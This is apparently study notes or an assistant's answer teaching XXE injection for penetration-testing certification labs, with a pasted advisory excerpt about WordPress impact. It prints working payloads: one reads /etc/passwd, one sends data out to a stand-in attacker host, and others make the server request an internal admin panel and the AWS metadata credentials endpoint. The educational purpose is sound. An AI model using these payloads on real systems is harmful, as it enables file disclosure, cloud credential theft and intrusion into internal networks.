To read `/etc/passwd` through an XML vulnerability, you are looking for an **XXE (XML External Entity)** injection. This happens when a web application processes XML input without disabling "external entities."

Here is how the attack works and the exact payload you would use.

---

### 🛠️ The Attack Payload

If the application normally expects a piece of XML like this:

XML

```
<user>
    <username>elliot</username>
</user>
```

You would intercept that request (using Burp Suite) and inject a **DOCTYPE** definition at the top:

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<user>
    <username>&xxe;</username>
</user>
```

---

### 🔍 How it works (Step-by-Step)

1. **The Declaration**: `<!DOCTYPE test [...]>` tells the XML parser we are defining some custom rules.
    
2. **The Entity**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` defines a "shortcut" named `&xxe;`. The `SYSTEM` keyword tells the server: _"Go find the content for this shortcut at this file path."_
    
3. **The Trigger**: By putting `&xxe;` inside the `<username>` tags, the server replaces that shortcut with the actual contents of the `/etc/passwd` file before it processes the data.
    
4. **The Result**: If the application displays your username back to you (e.g., "Welcome, [username]!"), it will instead display "Welcome, root:x:0:0:root:/root:/bin/bash..."
    

---

### 🚩 Where to find this in Labs (eJPT/CPTS)

You won't find this by just browsing. You have to look for:

- **File Uploads**: Specifically files like `.xml`, `.svg` (which are XML-based), or even `.docx`/`.xlsx` (which are zipped XML files).
    
- **API Requests**: Watch your Burp Suite history for requests with `Content-Type: application/xml` or `text/xml`.
    
- **Search Bars**: Some older search functions send the query to the server in an XML block.
    

---

### ⚠️ A Note on "Blind" XXE

Sometimes the server processes your XML but **doesn't** show the result on the screen. In that case, you can't just "read" the file. You have to make the server "exfiltrate" the data to you (e.g., making the server send the file contents to a web server you control).

**Example of an Out-of-Band (OOB) trigger:**

XML

```
<!ENTITY xxe SYSTEM "http://your-kali-ip.com/log?data=/etc/passwd">
```

---
---
## Impact

- **Arbitrary File Disclosure**: The contents of any file on the host’s file system could be retrieved, e.g. _wp-config.php_ which contains sensitive data such as database credentials.
- **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.


Think of **SSRF (Server-Side Request Forgery)** as the attacker using the server as a "proxy" to attack things the attacker can’t reach directly.

In a normal attack, you (the Hacker) try to hit a target. But often, the really juicy stuff (databases, admin panels, cloud metadata) is hidden behind a **Firewall**. The Firewall blocks you, but it **trusts** the Web Server.

### 🕵️ The "Proxy" Concept

In an XXE-based SSRF, you aren't asking the server for a local file (like `/etc/passwd`). Instead, you tell the XML parser to go to a **URL**.

Because the request comes **from the server's internal IP**, the internal systems think: _"Oh, this is coming from our trusted Web Server, it must be okay!"_

### 🛠️ Example: Scanning the Internal Network

Imagine there is an internal Admin panel at `http://192.168.1.50/admin` that is blocked from the internet. You can use XXE to make the server fetch it for you:

**The SSRF Payload:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.50/admin" > ]>
<svg ...>
   <text ...>&xxe;</text>
</svg>
```

When the server processes this, it tries to "render" the internal admin page inside the image. You just bypassed the firewall.

### ☁️ The "Nuclear" SSRF: Cloud Metadata

If the website is hosted on **AWS**, **Azure**, or **Google Cloud**, there is a special internal IP address (`169.254.169.254`) that only the server can talk to. This address contains **sensitive API keys** and credentials.

**The AWS Metadata Payload:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" >
```

If this works, you get the secret keys to the entire cloud account. This is how the famous **Capital One hack** happened!

### 📊 XXE: File Read vs. SSRF

|**Feature**|**Arbitrary File Read (LFI)**|**SSRF**|
|---|---|---|
|**Target**|Internal **Files** (`/etc/passwd`).|Internal **Servers** (`http://internal-db`).|
|**Protocol**|`file://`|`http://` or `https://`|
|**Goal**|Steal passwords/source code.|Pivot deeper into the network.|
